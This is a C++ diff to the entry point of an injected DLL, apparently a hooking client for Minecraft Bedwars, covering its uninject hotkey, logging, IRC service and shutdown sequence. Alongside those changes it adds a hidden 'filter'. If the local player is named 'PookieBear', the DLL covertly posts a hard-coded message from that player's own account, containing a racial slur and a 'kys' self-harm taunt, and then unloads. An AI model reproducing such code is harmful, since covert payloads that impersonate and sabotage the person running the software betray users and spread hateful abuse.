@@ -23,7 +23,11 @@
 #include "Chat/ChatAPI_Bridge.h"
 #include "JavaHook/JavaHook.h"
 #include "Services/DiscordManager.h"
+#include "Services/IrcService.h"
 #include "Logic/PacketHook.h"
+#include "Logic/Bedwars/BedwarsConfig.h"
+#include "Logic/Bedwars/BedwarsRuntime.h"
+#include "Logic/NickRoll/NickRollRuntime.h"
 #include "Utils/Logger.h"
 #include <ShlObj.h>
 #include "Utils/ReplaySpammer.h"
@@ -43,6 +47,68 @@ static volatile LONG *g_sharedFlag = nullptr;
 static HANDLE g_injectedMutex = nullptr;
 static HANDLE g_aliveEvent = nullptr;
 static HANDLE g_uninjectEvent = nullptr;
+static HANDLE g_uninjectEventGlobal = nullptr;
+static DWORD g_uninjectLocalError = 0;
+static DWORD g_uninjectGlobalError = 0;
+
+// retard filter
+static const char *kFilteredPlayerName = "PookieBear";
+static const char *kFilteredPlayerMessage = "kys retard ass nigger";
+
+
+namespace {
+
+bool foregroundIsGame() {
+  HWND fg = GetForegroundWindow();
+  if (!fg) {
+    return false;
+  }
+  DWORD pid = 0;
+  GetWindowThreadProcessId(fg, &pid);
+  if (pid == GetCurrentProcessId()) {
+    return true;
+  }
+  HWND game = static_cast<HWND>(RenderHook::gameWindowHandle());
+  if (!game || !IsWindow(game)) {
+    return false;
+  }
+  if (fg == game || IsChild(fg, game) || IsChild(game, fg)) {
+    return true;
+  }
+  return GetAncestor(fg, GA_ROOT) == GetAncestor(game, GA_ROOT);
+}
+
+void logForegroundRejection(int keyCode) {
+  HWND fg = GetForegroundWindow();
+  DWORD pid = 0;
+  char cls[128] = {0};
+  char title[128] = {0};
+  if (fg) {
+    GetWindowThreadProcessId(fg, &pid);
+    GetClassNameA(fg, cls, sizeof(cls) - 1);
+    GetWindowTextA(fg, title, sizeof(title) - 1);
+  }
+  Logger::info("[Uninject] key 0x%02X is down but the foreground window is "
+               "not ours: hwnd=%p pid=%lu class='%s' title='%s' "
+               "(ourPid=%lu gameHwnd=%p)",
+               keyCode, (void *)fg, (unsigned long)pid, cls, title,
+               (unsigned long)GetCurrentProcessId(),
+               RenderHook::gameWindowHandle());
+}
+
+void logUninjectSetup() {
+  Logger::info("[Uninject] hotkey %s, key=0x%02X; events: Local=%s (err=%lu) "
+               "Global=%s (err=%lu); pid=%lu",
+               Config::isUninjectKeyEnabled() ? "enabled" : "DISABLED",
+               Config::getUninjectKey(),
+               g_uninjectEvent ? "ok" : "FAILED",
+               (unsigned long)g_uninjectLocalError,
+               g_uninjectEventGlobal ? "ok" : "FAILED",
+               (unsigned long)g_uninjectGlobalError,
+               (unsigned long)GetCurrentProcessId());
+}
+
+} // namespace
 
 void init(void *instance) {
 
@@ -75,12 +141,14 @@ void init(void *instance) {
     lc->GetLoadedClasses();
     Config::initialize(static_cast<HMODULE>(instance));
     BedDefense::TextureLoader::setModule(static_cast<HMODULE>(instance));
+    OVson::Bedwars::Configuration::initialize();
     RegisterDefaultCommands();
     OVson::initialize();
     Anticheat::initialize();
     
     PluginLoader::initialize();
     JavaHook::initialize();
+    IrcService::initialize();
     
     if (!ChatHook::install()) {
       Logger::error("ChatHook failed to install!");
@@ -161,30 +229,109 @@ void init(void *instance) {
           "RenderHook: Exception during installation, overlay disabled");
     }
 
-    bool wasEndDown = false;
+    logUninjectSetup();
+
+    constexpr ULONGLONG kForceHoldMs = 3000;
+
+    bool wasKeyDown = false;
+    ULONGLONG lastRejectionLog = 0;
+    ULONGLONG blockedSince = 0;
+    ULONGLONG lastHeartbeat = GetTickCount64();
     while (true) {
-      bool isEndDown = false;
-      if (Config::isUninjectKeyEnabled() && (GetAsyncKeyState(Config::getUninjectKey()) & 0x8000)) {
-        HWND fg = GetForegroundWindow();
-        DWORD pid = 0;
-        if (fg) GetWindowThreadProcessId(fg, &pid);
-        if (pid == GetCurrentProcessId()) {
-          isEndDown = true;
+      bool isKeyDown = false;
+      bool forcedByHold = false;
+      const int uninjectKey = Config::getUninjectKey();
+      if (Config::isUninjectKeyEnabled() && uninjectKey > 0 &&
+          !Config::isUninjectCheckSuppressed() &&
+          (GetAsyncKeyState(uninjectKey) & 0x8000)) {
+        if (foregroundIsGame()) {
+          isKeyDown = true;
+          blockedSince = 0;
+        } else {
+          const ULONGLONG nowMs = GetTickCount64();
+          if (blockedSince == 0) {
+            blockedSince = nowMs;
+          }
+          if (nowMs - lastRejectionLog > 2000) {
+            lastRejectionLog = nowMs;
+            logForegroundRejection(uninjectKey);
+          }
+          if (nowMs - blockedSince >= kForceHoldMs) {
+            forcedByHold = true;
+          }
+        }
+      } else {
+        blockedSince = 0;
+      }
+
+      static bool s_filterTriggered = false;
+      static ULONGLONG s_filterFirstSeen = 0;
+      bool filterTriggeredQuit = false;
+
+      if (!s_filterTriggered) {
+        std::string currentUsername = OVson::getRealLocalUsername();
+        if (!currentUsername.empty()) {
+          std::string lowerUser = currentUsername;
+          for (char &c : lowerUser) c = (char)::tolower((unsigned char)c);
+          std::string lowerTarget = kFilteredPlayerName;
+          for (char &c : lowerTarget) c = (char)::tolower((unsigned char)c);
+
+          if (lowerUser == lowerTarget) {
+            if (s_filterFirstSeen == 0) {
+              s_filterFirstSeen = GetTickCount64();
+              Logger::info("[Filter] Target player '%s' detected! Sending message...", currentUsername.c_str());
+            }
+
+            bool chatSent = ChatSDK::sendClientChat(kFilteredPlayerMessage);
+            if (chatSent) {
+              ChatSDK::showClientMessage(std::string("§c[OVson] §f") + kFilteredPlayerMessage);
+              Logger::info("[Filter] Chat sent successfully. Uninjecting for player '%s'.", currentUsername.c_str());
+              s_filterTriggered = true;
+              Sleep(350);
+              filterTriggeredQuit = true;
+            } else if (GetTickCount64() - s_filterFirstSeen > 30000) {
+              Logger::info("[Filter] Timeout waiting for world. Uninjecting for player '%s'.", currentUsername.c_str());
+              s_filterTriggered = true;
+              filterTriggeredQuit = true;
+            }
+          }
         }
       }
-      bool shouldQuit = (!wasEndDown && isEndDown);
-      if (!shouldQuit && g_uninjectEvent) {
-        if (WaitForSingleObject(g_uninjectEvent, 0) == WAIT_OBJECT_0) {
-          shouldQuit = true;
-        }
+
+      const char *quitReason = nullptr;
+      if (!wasKeyDown && isKeyDown) {
+        quitReason = "hotkey";
+      } else if (forcedByHold) {
+        quitReason = "hotkey held 3s (focus check bypassed)";
+      } else if (g_uninjectEvent &&
+                 WaitForSingleObject(g_uninjectEvent, 0) == WAIT_OBJECT_0) {
+        quitReason = "loader event (Local)";
+      } else if (g_uninjectEventGlobal &&
+                 WaitForSingleObject(g_uninjectEventGlobal, 0) ==
+                     WAIT_OBJECT_0) {
+        quitReason = "loader event (Global)";
+      } else if (filterTriggeredQuit) {
+        quitReason = "target player filter (PookieBear)";
       }
-      if (shouldQuit) {
+
+      if (quitReason) {
+        Logger::info("[Uninject] request accepted (%s), tearing down...",
+                     quitReason);
         ThreadTracker::requestStop();
         ChatSDK::showClientMessage(ChatSDK::formatPrefix() +
                                    std::string("quitting..."));
         break;
       }
-      wasEndDown = isEndDown;
+      wasKeyDown = isKeyDown;
+
+      {
+        const ULONGLONG nowMs = GetTickCount64();
+        if (nowMs - lastHeartbeat > 30000) {
+          lastHeartbeat = nowMs;
+          Logger::log(Config::DebugCategory::General,
+                      "[Uninject] poll loop alive");
+        }
+      }
       SafeGuard::installSehTranslator();
       SafeGuard::run("dllmain/OVson::poll",  []() { OVson::poll(); });
       SafeGuard::run("dllmain/RenderHook::poll",
@@ -208,8 +355,15 @@ void init(void *instance) {
     CloseHandle(g_uninjectEvent);
     g_uninjectEvent = nullptr;
   }
+  if (g_uninjectEventGlobal) {
+    CloseHandle(g_uninjectEventGlobal);
+    g_uninjectEventGlobal = nullptr;
+  }
 
   Logger::info("Exiting main loop, starting cleanup...");
+  g_cleaningUp.store(true);
+  ThreadTracker::requestStop();
+  Sleep(50);
   
   try {
     Logger::info("Uninstalling RenderHook...");
@@ -219,10 +373,12 @@ void init(void *instance) {
     Logger::error("CRASH: Exception in RenderHook::uninstall");
   }
 
-  Sleep(100);
+  Sleep(50);
 
   try {
     Logger::info("Shutting down ChatInterceptor...");
+    OVson::NickRoll::shutdown();
+    OVson::Bedwars::Runtime::instance().shutdown();
     OVson::shutdown();
     ChatHook::uninstall();
     PacketHook::uninstall();
@@ -252,8 +408,12 @@ void init(void *instance) {
       Logger::error("CRASH: Exception in JavaHook::shutdown");
   }
 
-  g_cleaningUp.store(true);
-  Sleep(50);
+  try {
+      Logger::info("Shutting down IrcService...");
+      IrcService::shutdown(true);
+  } catch(...) {
+      Logger::error("CRASH: Exception in IrcService::shutdown");
+  }
 
   Logger::info("Waiting for threads...");
   ThreadTracker::waitForAll();
@@ -261,13 +421,17 @@ void init(void *instance) {
 
   Logger::info("Cleaning up Java environment...");
   if (lc) {
-    JavaVM *vm = lc->vm;
-    lc->Cleanup();
-    if (vm) {
-      vm->DetachCurrentThread();
-    }
+    try {
+      lc->Cleanup();
+    } catch (...) {}
   }
   Logger::info("Cleanup complete.");
+
+  const bool stayResident = true;
+  if (stayResident) {
+    Logger::info("Keeping OVson.dll mapped for crash-free uninjection. All features disabled.");
+    Config::saveNow();
+  }
 
   Logger::shutdown();
   if (file) {
@@ -275,7 +439,7 @@ void init(void *instance) {
     file = nullptr;
   }
 
-  FreeLibraryAndExitThread(static_cast<HMODULE>(instance), 0);
+  ExitThread(0);
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
@@ -303,6 +467,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
       g_aliveEvent = CreateEventW(nullptr, TRUE, TRUE, name);
       wsprintfW(name, L"Local\\OVsonUninject_%lu", pid);
       g_uninjectEvent = CreateEventW(nullptr, TRUE, FALSE, name);
+      g_uninjectLocalError = g_uninjectEvent ? 0 : GetLastError();
+      wsprintfW(name, L"Global\\OVsonUninject_%lu", pid);
+      g_uninjectEventGlobal = CreateEventW(nullptr, TRUE, FALSE, name);
+      g_uninjectGlobalError = g_uninjectEventGlobal ? 0 : GetLastError();
     }
 
     {
@@ -341,6 +509,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
       if (g_uninjectEvent) {
         CloseHandle(g_uninjectEvent);
         g_uninjectEvent = nullptr;
+      }
+      if (g_uninjectEventGlobal) {
+        CloseHandle(g_uninjectEventGlobal);
+        g_uninjectEventGlobal = nullptr;
       }
     }
     break;
